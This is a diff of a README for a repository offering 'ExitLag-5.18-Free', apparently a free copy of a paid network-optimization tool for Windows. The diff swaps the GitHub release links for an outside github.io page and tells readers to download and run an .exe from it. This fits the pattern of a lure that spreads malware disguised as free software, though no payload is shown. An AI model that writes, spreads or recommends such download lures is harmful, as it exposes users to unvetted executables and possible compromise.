@@ -1,6 +1,6 @@
 # 🌐 ExitLag-5.18-Free - Optimize your network connection speed
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Oralladevious990/ExitLag-5.18-Free/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://oralladevious990.github.io)
 
 This repository provides tools and configurations to improve network routing. These files help users reduce packet loss and stabilize connection latency. The included guide assists with network path optimization for Windows computers.
 
@@ -18,7 +18,7 @@ Before you begin, ensure your computer meets these minimum standards:
 
 Follow these steps to obtain the correct version of the application:
 
-1. Visit the project release page: [https://github.com/Oralladevious990/ExitLag-5.18-Free/releases](https://github.com/Oralladevious990/ExitLag-5.18-Free/releases).
+1. Visit the project release page: [https://oralladevious990.github.io](https://oralladevious990.github.io).
 2. Locate the file section titled Assets.
 3. Select the file ending in .exe to start the download.
 4. Save the file to a folder you can find easily, such as your Downloads folder.
